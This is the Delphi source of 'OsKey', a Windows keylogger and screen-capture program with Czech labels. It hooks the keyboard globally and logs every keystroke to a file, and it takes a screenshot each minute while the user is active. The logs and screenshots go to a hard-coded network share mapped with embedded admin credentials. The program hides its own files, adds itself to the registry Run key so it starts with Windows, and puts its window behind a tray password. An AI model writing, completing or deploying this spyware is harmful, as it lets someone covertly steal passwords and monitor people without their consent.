unit OsKey;

interface

uses
  Windows, Messages, SysUtils, Forms, StdCtrls, Classes, Controls, Vcl.ExtCtrls,
  Vcl.Dialogs, Vcl.Buttons, Vcl.Graphics, system.Json,ShellApi,Registry,
  Vcl.FileCtrl;
const
     LibInst:HInst=0;
     hHk:HHOOK=0;
     MSG_KBD=WM_APP+12321;

type
  TFormOsKey = class(TForm)
    txtStatus: TMemo;
    Button1: TButton;
    Button2: TButton;
    Edit1: TEdit;
    LabeledEdit1: TLabeledEdit;
    Timer1: TTimer;
    Label1: TLabel;
    CestaLabelEdit: TLabeledEdit;
    Panel1: TPanel;
    Label2: TLabel;
    BitBtn1: TBitBtn;
    OpenDialog1: TOpenDialog;
    GroupBox1: TGroupBox;
    ListBox1: TListBox;
    TrayIcon1: TTrayIcon;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button3: TButton;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Button4: TButton;
    Button8: TButton;
    Button9: TButton;
    GroupBox2: TGroupBox;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Timer2: TTimer;
    Label10: TLabel;
    aktiveLabel: TLabel;
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure KbdMsg(var Msg:TMessage);message MSG_KBD;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure CestaLabelEditDblClick(Sender: TObject);
    procedure TrayIcon1DblClick(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Button7Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure TrayIcon1Click(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure txtStatusChange(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);

  private
    { Private declarations }
  public

    { Public declarations }

  end;
function HookKeyboard(Hwnd,MsgID:Cardinal):LongInt;stdcall;external 'HkLib.dll' name 'HookKeyboard';   //Konstantin Tretyakov (from psc cd)
function UnhookKeyboard:Boolean;stdcall;external 'HkLib.dll' name 'UnhookKeyboard';  //Konstantin Tretyakov (from psc cd)
function Hooked:Boolean;stdcall;external 'HkLib.dll' name 'Hooked';         //Konstantin Tretyakov (from psc cd)




var
  FormOsKey: TFormOsKey;
  poc:Integer = 0;
  zk:string;
  cesta:string = '\\192.168.1.100\foder\';   // set share drive
  heslo:string = 'pass';      // set password
  aktivita:Boolean;
  aktivitaCas:Integer = 60;
  casUlozeni:Integer;
  run : Boolean;
  Xx, Yy : Integer;



const
  CtlChars:set of Byte=[1..12,14..31];
implementation
{$R *.DFM}

uses  Jpeg,
      PngImage,
      inifiles;
      //uLkJSON in 'json.pas';
function ISDrive(drv : string) : boolean;
begin
          result:=getdrivetype(pchar(drv))>1;
end;

procedure ReadIniF;
var
ini : TIniFile;
begin
Ini := TIniFile.Create('.\SetOsKey.ini');
   try
     casUlozeni:= Ini.ReadInteger( 'Set', 'time', casUlozeni );
     FormOsKey.Label7.Caption := IntToStr(casUlozeni);
     run := Ini.ReadBool( 'Set', 'Init',run);
     FormOsKey.Label9.Caption := BoolToStr(run);
   finally
     Ini.Free;
   end;
end;



function UnMountDisk(Drive : String):Integer;
begin
  Result := WNetCancelConnection2(PChar(Drive), 0, false);
end;

function MakeDriveMapping(DriveLetter: string; DirectoryPath: string;
  Username: string; Password: string; RestoreAtLogon: Boolean): DWORD;
var
  NetResource: TNetResource;
  dwFlags: DWORD;
begin
  with NetResource do
  begin
    dwType := RESOURCETYPE_DISK;
    lpLocalName := PChar(DriveLetter);
    lpRemoteName := PChar(DirectoryPath);
  lpProvider := nil;
  end;
  if (RestoreAtLogon) then
    dwFlags := CONNECT_UPDATE_PROFILE
  else
    dwFlags := 0;
  Result := WNetAddConnection2(NetResource, PChar(Password),
    PChar(Username), dwFlags);
end;

procedure WriteLog(const text:string);
var
F:TextFile;
datumcas:string;
begin


  DateTimeToString(datumcas, 'dd.m.yyyy hh:nn:ss', now);

   if FileExists('OsKeyLog.file') then
    begin
          AssignFile(F,'OsKeyLog.file');
          Append(F);
          Writeln(F,text +':'+datumcas);
          CloseFile(F);
    end
    else
      begin
          AssignFile(F,'OsKeyLog.file');
          Rewrite(F);
          Writeln(F,text +':'+datumcas);
          CloseFile(F);
      end;
end;

procedure ShellOpen(const Url: string; const Params: string = '');
begin
  ShellExecute(0, 'Open', PChar(Url), PChar(Params), nil, SW_SHOWNORMAL);
end;



procedure CaptureScreen(FileName: TFileName;const Kvalita:Byte;const Sirka, Vyska:Cardinal);
var DeskTopDC: HDc;
DeskTopCanvas: TCanvas;
DeskTopRect: TRect;
Bitmap:TBitmap;
Jpg: TJpegImage;

ARect:TRect;
begin
DeskTopDC := GetWindowDC(GetDeskTopWindow);
DeskTopCanvas := TCanvas.Create;
DeskTopCanvas.Handle := DeskTopDC;
DeskTopRect := Rect(0,0, Screen.Width,Screen.Height);
Bitmap:=TBitmap.Create;
Bitmap.Width:=Screen.Width;
Bitmap.Height:=Screen.Height;
Bitmap.Canvas.CopyRect(DeskTopRect, DeskTopCanvas, DeskTopRect);
ARect:= Rect(0, 0, Sirka, Vyska);
Bitmap.Canvas.StretchDraw(ARect, Bitmap);
Bitmap.Width:= Sirka;
Bitmap.Height:= Vyska;
Jpg:= TJPEGImage.Create;
Jpg.Assign(Bitmap);
Jpg.CompressionQuality:= Kvalita;
Jpg.Compress;
Jpg.SaveToFile(FileName);
FreeAndNil(Jpg);
FreeAndNil(Bitmap);
FreeAndNil(DeskTopCanvas);
ReleaseDC(GetDeskTopWindow, DeskTopDC);
end;



procedure TFormOsKey.KbdMsg(var Msg:TMessage);
var KN:PChar;tmpRes:Integer; KS:TKeyBoardState; ch:String;
lp,wp:LongInt;
F : TextFile;
password:string;
label Bye;
begin

        //If you hide the sys tray icon with the ctrl alt f12 hotkey, you will see the form
   {
   if poc = 3 then
    begin
      if zk = 'CtrlAltF12' then
        begin
             password := InputBox('OsKey','Password','');
              if password = heslo then
              begin
                  FormOsKey.Visible := not FormOsKey.Visible;
                  Show;
                  WindowState := wsNormal;
                  ShowWindow(Application.Handle, SW_SHOW);
              end;

        end;

      zk := '';
      poc :=0;
    end;

     }
   LabeledEdit1.Text := inttostr(poc);
   Edit1.Text := zk;

   if not FileExists('OsKeyLog.file') then
    begin
          AssignFile(F, 'OsKeyLog.file');
          Rewrite(F);
          CloseFile(F);
    end;

    AssignFile(F, 'OsKeyLog.file');
    append(F);





     lp:=Msg.lParam;wp:=Msg.wParam;
     if ((lp and $80000000)=0) then begin
        KN:=StrAlloc(2);
        if GetKeyboardState(KS)=False then goto Bye;
        tmpRes:=ToAscii(wp,lp,KS,KN,0);
        if (tmpRes=1) and not(Ord(String(KN)[1])in CtlChars) then
          begin
             ch:=String(KN)[1];
             if ord(ch[1])=13 then ch:=ch+#10;
             FormOsKey.txtStatus.Text:=FormOsKey.txtStatus.Text+ch;
             Write(F,ch);
             zk:=zk+ch;
             poc := poc + 1;

          end
        else
        begin
           KN:=StrAlloc(10);
           if GetKeyNameText(lp,KN,10)<> 0 then
             begin
                FormOsKey.txtStatus.Text:=FormOsKey.txtStatus.Text+'{'+String(KN)+'}';
                Write(F,'{'+String(KN)+'}');
                zk:=zk+KN;
                poc:= poc + 1;
                if KN = 'Ctrl' then
                  begin
                    poc := 1;
                    zk := KN;
                  end;

             end;
        end;
     end;
     CloseFile(F);
Bye:
end;
procedure TFormOsKey.Button2Click(Sender: TObject);
begin
     if hHk=0 then Exit;
     if UnhookKeyboard=False then
        MessageBox(Handle,'Failed','Error',MB_ICONHAND)
     else begin
         hHk:=0;
         Button1.Enabled:=True;
         WriteLog('Uživatel vypnul sken klávesnice');
     end;
end;
procedure TFormOsKey.Button3Click(Sender: TObject);
begin
SetFileAttributes(PChar(Application.ExeName), FILE_ATTRIBUTE_HIDDEN);
SetFileAttributes(PChar('HkLib.dll'), FILE_ATTRIBUTE_HIDDEN);
SetFileAttributes(PChar('OsKeyLog.file'), FILE_ATTRIBUTE_HIDDEN);
end;

procedure TFormOsKey.Button4Click(Sender: TObject);
var
xi:integer;
begin
MakeDriveMapping('A:', cesta,'admin', 'password', False);


end;

procedure TFormOsKey.Button5Click(Sender: TObject);
var
R: TRegistry;
begin
  R := TRegistry.Create;

  try
    R.RootKey :=  HKEY_LOCAL_MACHINE;
    if not R.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', True) then
      RaiseLastOSError;
    R.WriteString('OsKey', Application.ExeName );
    ListBox1.Items.Add('Add reg: '+ Application.ExeName );
  finally R.Free;
  end;
end;

procedure TFormOsKey.Button6Click(Sender: TObject);
var
R: TRegistry;
begin
  R := TRegistry.Create;

  try
    R.RootKey :=  HKEY_LOCAL_MACHINE;
    if not R.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', True) then
      RaiseLastOSError;
    R.DeleteValue(Application.ExeName);
    ListBox1.Items.Add('Del reg: '+Application.ExeName);

  finally
    R.CloseKey;
    R.Free;
  end;

end;

procedure TFormOsKey.Button7Click(Sender: TObject);
begin
FormOsKey.Visible := False;
end;

procedure TFormOsKey.Button8Click(Sender: TObject);
begin
UnMountDisk('A:');
end;

procedure TFormOsKey.Button9Click(Sender: TObject);
var
   Ini: TIniFile;
 begin
   Ini := TIniFile.Create( '.\SetOsKeys.ini');
   try
     Ini.WriteInteger( 'Set', 'time', 10);
     Ini.WriteString( 'Set', 'Caption', Caption );
     Ini.WriteBool( 'Set', 'InitMax', True );
   finally
   Ini.Free;
   end;
 end;

procedure TFormOsKey.CestaLabelEditDblClick(Sender: TObject);
begin
ShellOpen(CestaLabelEdit.Text);
end;

procedure TFormOsKey.FormClose(Sender: TObject; var Action: TCloseAction);
var
F:TextFile;
datumcas:string;
begin


DateTimeToString(datumcas, 'dd.m.yyyy hh:nn:ss', now);
   if FileExists('OsKeyLog.file') then
    begin
          AssignFile(F, 'OsKeyLog.file');
          Append(F);
          Writeln(F,'Program ukonèen v '+datumcas);
          CloseFile(F);
    end
    else
      begin
          AssignFile(F, 'OsKeyLog.file');
          Rewrite(F);
          Writeln(F,'Program ukonèen v '+datumcas);
          CloseFile(F);
      end;





end;

procedure TFormOsKey.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
var
  pass: string;
 // ClickedOK: Boolean;
begin
  {
  pass := '';
  ClickedOK := InputQuery('OsKey', #31'Password:', pass);

  if pass=heslo then
    CanClose := True
    else
    begin
      CanClose := False;
      FormOsKey.Visible:= False;
    end;
   }






end;

procedure TFormOsKey.FormCreate(Sender: TObject);
var
 js: TJSONObject;
   Ini: TIniFile;

begin
     CestaLabelEdit.Text:=cesta;

      hHk:=HookKeyboard(Handle,MSG_KBD);
      if hHk=0 then MessageBox(Handle,'Failed','Error muj',MB_ICONERROR)
        else begin
        Button1.Enabled:=False;
      end;
      js := TJSONObject.Create;



     Label3.Caption := Application.ExeName;

  if not FileExists('SetOsKey.ini') then
    begin

    Ini := TIniFile.Create( '.\SetOsKey.ini');
     try
       Ini.WriteInteger( 'Set', 'Time', 0);
       casUlozeni := 0;
       Ini.WriteBool( 'Set', 'Init', True );
       run := True;
     finally
     Ini.Free;
     end;
    end;


end;

procedure TFormOsKey.FormDestroy(Sender: TObject);
begin
WriteLog('Program ukonèen v ');
end;

procedure TFormOsKey.BitBtn1Click(Sender: TObject);
begin
with TFileOpenDialog.Create(nil) do
    try
      Title := 'Select Directory';
      Options := [fdoPickFolders, fdoPathMustExist, fdoForceFileSystem]; // YMMV
      OkButtonLabel := 'Select';
      DefaultFolder := CestaLabelEdit.Text;
      FileName := '';
      if Execute then
        CestaLabelEdit.Text := FileName;
    finally
      Free;
    end
end;

procedure TFormOsKey.Button1Click(Sender: TObject);
begin
      hHk:=HookKeyboard(Handle,MSG_KBD);
      if hHk=0 then MessageBox(Handle,'Failed','Error',MB_ICONERROR)
        else begin
        Button1.Enabled:=False;
      end;
end;

procedure TFormOsKey.Timer1Timer(Sender: TObject);
var
formattedDateTime, adresar,sekundy,cas : string;

begin
  ReadInif;
  DateTimeToString(adresar, 'dd_m_yyyy', now);
  if Xx <> Mouse.CursorPos.X then
    begin
      aktivitaCas := 60;
      if not Timer2.Enabled then
        Timer2.Enabled := True;
    end;
  if Yy <> Mouse.CursorPos.Y then
    begin
    aktivitaCas := 60;
    if not Timer2.Enabled then
      Timer2.Enabled := True;
    end;

  if Timer2.Enabled then
     if run then
      begin

     if not ISDrive('A:')  then
        MakeDriveMapping('A:', cesta,'admin', 'password', False);

       if ISDrive('A:')  then
        begin
          if not DirectoryExists('A:\'+adresar) then
              begin
                ListBox1.Items.Add('Neexistuje adresar - Tvoøím');
                ListBox1.Items.Add('A:\'+adresar);
                CreateDir('A:\'+adresar);
              end;
            DateTimeToString(sekundy, 'ss', now);
            DateTimeToString(cas, 'hh_mm', now);
          if sekundy = '00' then
            begin
              CaptureScreen('A:\'+adresar+'\'+cas+'.jpg',40,1600,800);
              txtStatus.Lines.SaveToFile('A:\'+adresar+'\'+cas+'.log');
              txtStatus.Lines.Clear;
            end;
          DateTimeToString(formattedDateTime, 'hh:mm:ss', now);
          Label1.Caption := formattedDateTime;
          Label4.Caption :=' X:' + IntToStr(Mouse.CursorPos.X);
          Label5.Caption :=' Y:' +IntToStr( Mouse.CursorPos.Y);
          UnMountDisk('A:');

        end
        else
          begin
            ListBox1.Items.Add('Zapisuji do lokálu');
            if not DirectoryExists(adresar) then
              begin
                ListBox1.Items.Add('Neexistuje adresar - Tvoøím');
                ListBox1.Items.Add(adresar);
                CreateDir(adresar);
              end;
            DateTimeToString(sekundy, 'ss', now);
            DateTimeToString(cas, 'hh_mm', now);
          if sekundy = '00' then
            begin
              CaptureScreen(adresar+'\'+cas+'.jpg',40,1600,800);
              txtStatus.Lines.SaveToFile(adresar+'\'+cas+'.log');
              txtStatus.Lines.Clear;
            end;
          DateTimeToString(formattedDateTime, 'hh:mm:ss', now);
          Label1.Caption := formattedDateTime;
          Label4.Caption :=' X:' + IntToStr(Mouse.CursorPos.X);
          Label5.Caption :=' Y:' +IntToStr( Mouse.CursorPos.Y);

          end;
      end
      else
        ListBox1.Items.Add('timer stojí') ;



  if Timer2.Enabled then
      aktiveLabel.Caption := 'Aktivita : True'
  else
     aktiveLabel.Caption := 'Aktivita : False';

   Xx :=Mouse.CursorPos.X;
   Yy :=Mouse.CursorPos.Y;


end;

procedure TFormOsKey.Timer2Timer(Sender: TObject);
begin

if aktivitaCas < 1 then
  Timer2.Enabled := False
  else
    aktivitaCas := aktivitaCas - 1;

  Label10.Caption := 'èas:' + IntToStr(aktivitaCas);
end;

procedure TFormOsKey.TrayIcon1Click(Sender: TObject);
begin
FormOsKey.Visible:=False;
end;

procedure TFormOsKey.TrayIcon1DblClick(Sender: TObject);
var
password:string;
begin
  //TrayIcon1.Visible := False;
  password := InputBox('OsKey',#31'Password','');
  if password = heslo then
  begin
      Show;
      WindowState := wsNormal;
      ShowWindow(Application.Handle, SW_SHOW);
  end;



end;


procedure TFormOsKey.txtStatusChange(Sender: TObject);
begin
aktivitaCas := 60;
if not Timer2.Enabled then
  Timer2.Enabled := True;
end;

end.
